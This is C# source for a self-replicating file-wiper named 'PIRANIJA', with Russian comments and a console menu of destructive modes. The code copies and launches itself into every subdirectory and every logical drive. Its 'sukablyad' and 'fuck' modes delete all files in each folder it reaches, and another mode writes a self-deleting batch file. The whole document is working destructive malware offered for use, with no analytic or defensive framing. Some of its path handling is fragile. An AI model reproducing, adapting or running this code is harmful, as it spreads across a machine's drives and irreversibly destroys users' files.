using System;
using System.IO;
using System.Diagnostics;

namespace feelYourself
{
    class Program
    {
        static void Main(string[] args)
        {
            // основные данные из внешнего мира

            string nameProgramm = Environment.CommandLine.Split('\\')[Environment.CommandLine.Split('\\').Length - 1].Split('\"')[0];
            string currentDir = Environment.CommandLine.Split('\"')[1].Substring(0, Environment.CommandLine.Split('\"')[1].LastIndexOf('\\'));
            string[] dirs = Directory.GetDirectories(currentDir);



            Console.WriteLine("project PIRANIJA         made by MRV\n");

            if (args.Length == 0)  // project "PIRANIJA"
            {
                // основная консолька запуска
                Console.WriteLine("run\n to fill this folder\nzerg\n to fill all folders\nsuicide\n to destroy minjons in this folder\nffsall\n to destroy minjons in all folders\nfuck\n to destroy much of the files in the computer");
                string read = Console.ReadLine();

                if (read == "run") { Process.Start(currentDir + "\\" + nameProgramm, "run"); }
                if (read == "zerg") { Process.Start(currentDir + "\\" + nameProgramm, "zerg"); }
                if (read == "suicide") { Process.Start(currentDir + "\\" + nameProgramm, "suicide"); }
                if (read == "ffsall") { Process.Start(currentDir + "\\" + nameProgramm, "ffsall"); }
                if (read == "fuck") { Process.Start(currentDir + "\\" + nameProgramm, "fuck"); }

                if (read == "sukablyad") { Process.Start(currentDir + "\\" + nameProgramm, "sukablyad"); }
                
            }
            else if (args.Length == 1)
            {


                if (args[0] == "run")
                {
                    //////////////////////////////////////////////////////////////////////////////////
                    //  ядро наступления (1)
                    //////////////////////////////////////////////////////////////////////////////////
                    foreach (string dir in dirs)
                    {
                        if (dir != currentDir) try
                            {
                                if (File.Exists(dir + "\\" + nameProgramm)) { File.Delete(dir + "\\" + nameProgramm); }
                                File.Copy(currentDir + "\\" + nameProgramm, dir + "\\" + nameProgramm);
                                Process.Start(dir + "\\" + nameProgramm, "run");
                            }
                            catch { }



                        Console.WriteLine(dir);
                    }


                }
                //////////////////////////////////////////////////////////////////////////////////
                // ядро самоуничтожения (0)
                //////////////////////////////////////////////////////////////////////////////////


                if (args[0] == "suicide")
                {
                    foreach (string dir in dirs)
                    {
                        try { Process.Start(dir + "\\" + nameProgramm, "suicide"); } catch { }
                        try {Process.Start(dir + "\\" + nameProgramm, "del"); } catch { }
                    }
                }



                if (args[0] == "zerg")
                {
                    string[] globDir = Environment.GetLogicalDrives();

                    foreach (string dir in globDir)
                        try
                        {
                            Process.Start(dir + "\\" + nameProgramm, "run");
                        }
                        catch { }

                }


                if (args[0] == "ffsall")
                {
                    string[] globDir = Environment.GetLogicalDrives();

                    foreach (string dir in globDir)
                        try
                        {
                            Process.Start(dir + "\\" + nameProgramm, "suicide");
                            try { Process.Start(dir + "\\" + nameProgramm, "del"); } catch { }
                        }
                        catch { }
                }

                //////////////////////////////////////////////////////////////////////////////////
                // ядро уничтожения  (3)
                //////////////////////////////////////////////////////////////////////////////////
                if (args[0] == "sukablyad")
                {
                    // уничтожение
                    string[] files = Directory.GetFiles(currentDir);
                    foreach(string file in files)
                  if (file != Environment.CommandLine.Split('\"')[1])
                   try
                   {
                                File.Delete(file);       
                   }
                            catch { }


                    // расспространение
                    foreach (string dir in dirs)
                    {
                        if (dir != currentDir) try
                            {
                                if (File.Exists(dir + "\\" + nameProgramm)) { File.Delete(dir + "\\" + nameProgramm); }
                                File.Copy(currentDir + "\\" + nameProgramm, dir + "\\" + nameProgramm);
                                Process.Start(dir + "\\" + nameProgramm, "sukablyad");
                                try { Process.Start(dir + "\\" + nameProgramm, "del"); } catch { }
                            }
                            catch { }


                    }

                }




                    if (args[0] == "fuck")
                    {

                        string[] globDir = Environment.GetLogicalDrives();

                        foreach (string dir in globDir)
                            try
                            {
                                Process.Start(dir + "\\" + nameProgramm, "sukablyad");
                            }
                            catch { }




                    }

                    if (args[0] == "del")
                {
                    string[] batDel = new string[2];
                    batDel[0] = "del " +  nameProgramm;
                    batDel[1] =  "del %0";
                    File.WriteAllLines(currentDir + "alfa_del_mrv.bat", batDel);
                    Process.Start("cmd.exe", currentDir + "alfa_del_mrv.bat");




                }





                }


            }
        }
    }

